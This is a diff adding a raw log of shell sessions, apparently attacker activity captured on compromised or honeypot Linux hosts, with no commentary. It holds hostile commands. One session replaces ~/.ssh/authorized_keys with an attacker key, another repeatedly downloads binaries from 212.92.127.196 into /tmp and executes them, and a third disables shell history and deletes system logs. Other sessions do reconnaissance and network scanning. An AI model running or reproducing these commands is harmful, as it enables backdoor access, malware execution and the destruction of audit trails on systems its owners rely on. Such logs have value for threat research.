@@ -1,0 +1,165 @@
+Session ID: 246820ce25d4
+rm -rf /var/tmp/.var03522123
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+top
+uname
+uname -a
+lscpu | grep Model
+rm -rf /var/tmp/dota*
+sleep 15s && cd /var/tmp
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+whoami
+
+Session ID: b07313db
+ls
+mc
+sudo apt-get install mc
+apt-get install mc
+mc
+htop
+top
+ls
+cd Do
+cd /home/dickie/Documents
+ls
+cd /home/dickie/Documents/IMPORTANT
+la
+ls
+cd /home/dickie/Documents
+ls
+ping www.terra.es
+ifconfig
+sudo ifcofnig
+sudo ifconfig
+exit
+
+Session ID: 04e8a020
+ls
+ls /home/alexis/Videos
+ls /home/alexis/Downloads
+less Downloads/20161216_work.txt
+ls /home/alexis/Downloads
+ls
+ls /home/alexis/Pictures
+exit
+
+Session ID: aee52ab8
+ls
+ls
+cd Do
+cd /home/debby/Documents
+ls
+vi /home/debby/Documents/faq-congo.pdf
+free
+free -h
+ping www.terra.es
+ping www.elmundo.es
+wget
+wget www.terra.es
+ls
+vi /home/debby/Documents/index.html
+sudo vi /home/debby/Documents/index.html
+vi /home/debby/Documents/index.html
+nano
+ed
+apt-get
+sudo apt-get vi
+apt-get vi
+
+Session ID: 69680775
+ls
+cd /home/ted/situation_baghdad_047581
+ls
+scp
+scp /situation
+cd /home/ted
+scp /situation_baghdad_047581/ /
+sudo apt-get install nbtscan
+apt-get install nbtscan
+nbtscan 45.118.133.235
+dc
+stop
+shutdown
+
+Session ID: 69485d99
+wget http://212.92.127.196/.1 -O /tmp/..1
+wget1 http://212.92.127.196/.1 -O /tmp/..1
+chmod +x /tmp/..1
+/tmp/..1 &
+wget http://212.92.127.196/.2 -O /tmp/..2
+wget1 http://212.92.127.196/.2 -O /tmp/..2
+chmod +x /tmp/..2
+/tmp/..2 &
+wget http://212.92.127.196/.3 -O /tmp/..3
+wget1 http://212.92.127.196/.3 -O /tmp/..3
+chmod +x /tmp/..3
+/tmp/..3 &
+wget http://212.92.127.196/.4 -O /tmp/..4
+wget1 http://212.92.127.196/.4 -O /tmp/..4
+chmod +x /tmp/..4
+/tmp/..4 &
+wget http://212.92.127.196/.5 -O /tmp/..5
+wget1 http://212.92.127.196/.5 -O /tmp/..5
+chmod +x /tmp/..5
+/tmp/..5 &
+wget http://212.92.127.196/.6 -O /tmp/..6
+wget1 http://212.92.127.196/.6 -O /tmp/..6
+chmod +x /tmp/..6
+/tmp/..6 &
+wget http://212.92.127.196/.7 -O /tmp/..7
+wget1 http://212.92.127.196/.7 -O /tmp/..7
+chmod +x /tmp/..7
+/tmp/..7 &
+wget http://212.92.127.196/.8 -O /tmp/..8
+wget1 http://212.92.127.196/.8 -O /tmp/..8
+chmod +x /tmp/..8
+/tmp/..8 &
+wget http://212.92.127.196/.9 -O /tmp/..9
+wget1 http://212.92.127.196/.9 -O /tmp/..9
+chmod +x /tmp/..9
+/tmp/..9 &
+wget http://212.92.127.196/.10 -O /tmp/..10
+wget1 http://212.92.127.196/.10 -O /tmp/..10
+chmod +x /tmp/..10
+/tmp/..10 &
+wget http://212.92.127.196/.11 -O /tmp/..11
+wget1 http://212.92.127.196/.11 -O /tmp/..11
+chmod +x /tmp/..11
+/tmp/..11 &
+wget http://212.92.127.196/.12 -O /tmp/..12
+wget1 http://212.92.127.196/.12 -O /tmp/..12
+chmod +x /tmp/..12
+/tmp/..12 &
+
+Session ID: 68e36d03
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
+history -n
+export HISTFILE=/dev/null
+export HISTSIZE=0
+export HISTFILESIZE=0
+rm -rf /var/log/wtmp
+rm -rf /var/log/lastlog
+rm -rf /var/log/secure
+rm -rf /var/log/xferlog
+rm -rf /var/log/messages
+rm -rf /var/run/utmp
+touch /var/run/utmp
+touch /var/log/messages
+touch /var/log/wtmp
+touch /var/log/messages
+touch /var/log/xferlog
+touch /var/log/secure
+touch /var/log/lastlog
+rm -rf /var/log/maillog
+touch /var/log/maillog
+rm -rf /root/.bash_history
+touch /root/.bash_history
+history -r
+uname
+free -m
+ps -x
